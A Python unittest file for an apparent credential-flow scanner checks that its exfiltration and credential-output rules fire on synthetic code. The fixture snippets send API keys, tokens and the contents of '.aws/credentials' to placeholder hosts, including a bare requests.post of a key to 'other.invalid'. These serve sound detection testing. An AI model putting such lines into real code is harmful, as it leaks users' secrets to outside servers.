"""Bounded literal format URLs retain auth purpose, never endpoint trust."""

import unittest
from test_qindun_certify import MODULE


class PythonQueryFormatBindingTests(unittest.TestCase):
    def test_literal_format_auth_with_logging_and_mixed_payload(self):
        urls = [
            '"https://service.invalid/api?key={}".format(key)',
            '"https://service.invalid/api?key={0}".format(key)',
            '"https://service.invalid/api?key={token}".format(token=key)',
            '"https://service.invalid/api?token={1}&api_key={0}".format(key, other)',
        ]
        for url in urls:
            for wrapped in (False, True):
                for keyword in (False, True):
                    with self.subTest(url=url, wrapped=wrapped, keyword=keyword):
                        prefix = 'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_TOKEN")\n'
                        call = f"requests.get({'url=' if keyword else ''}{url})"
                        if wrapped:
                            prefix += f"def fetch(key,other):\n    return {call}\n"
                            call = "fetch(key,other)"
                        source = prefix + f"response={call}\nprint(response.url)\n"
                        hits, error = MODULE._python_flow_findings("main.py", source)
                        self.assertIsNone(error)
                        self.assertEqual(
                            {
                                h.disposition
                                for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                            },
                            {"candidate"},
                        )
                        self.assertTrue(
                            any(h.rule_id == "QINDUN.D5.CREDENTIAL_OUTPUT" for h in hits)
                        )
                        hits, _ = MODULE._python_flow_findings(
                            "main.py", source + 'requests.post("https://other.invalid",data=key)\n'
                        )
                        self.assertEqual(
                            {
                                h.disposition
                                for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                            },
                            {"candidate", "confirmed"},
                        )

    def test_ambiguous_or_extra_payload_stays_actionable(self):
        urls = [
            '"https://{host}/api?key={key}".format(host=host,key=key)',
            '"https://service.invalid/api?key={}&token={0}".format(key)',
            '"https://service.invalid/api?key={key.value}".format(**{"key.value":key})',
            '"https://service.invalid/api?key={key}".format_map({"key":key})',
            '"https://service.invalid/{model}?key={key}".format(model=host,key=key)',
            '"http://service.invalid/api?key={}".format(key)',
            '"https://user@service.invalid/api?key={}".format(key)',
            '"https://service.invalid:8443/api?key={}".format(key)',
            '"https://service.invalid/api?key={0}&dump={1}".format(key,other)',
            '"https://service.invalid/api?key={0}&key={1}".format(key,other)',
            '"https://service.invalid/{0}?key=public".format(key)',
            '"https://service.invalid/api?key=prefix-{0}".format(key)',
            '"https://service.invalid/api?key={0!r}".format(key)',
            '"https://service.invalid/api?key={0:>20}".format(key)',
            '"https://service.invalid/api?key={0.value}".format(key)',
            '"https://service.invalid/api?key={0[0]}".format([key])',
            '"https://service.invalid/api?key={}".format([key,other])',
            '"https://service.invalid/api?key={}".format(open(".aws/credentials").read())',
            '"https://service.invalid/api?key={0}".format(key,other)',
            '"https://service.invalid/api?key={key}".format(key=key,extra=other)',
            '"https://service.invalid/api?key={}".format(*args)',
            '"https://service.invalid/api?key={key}".format(**kwargs)',
            '"https://{0}/?key=%51INDUNQUERYVALUE0END&token={1}".format(host,key)',
            '"https://service.invalid/api?key={0}{".format(key)',
        ]
        prefix = (
            'import os,requests\nkey=os.getenv("API_KEY")\nother=os.getenv("OTHER_TOKEN")\n'
            'args=[key]\nkwargs={"key":key}\n'
        )
        for url in urls:
            with self.subTest(url=url):
                hits, _ = MODULE._python_flow_findings("main.py", prefix + f"requests.get({url})\n")
                self.assertTrue(
                    any(
                        h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION"
                        and h.disposition == "confirmed"
                        for h in hits
                    )
                )
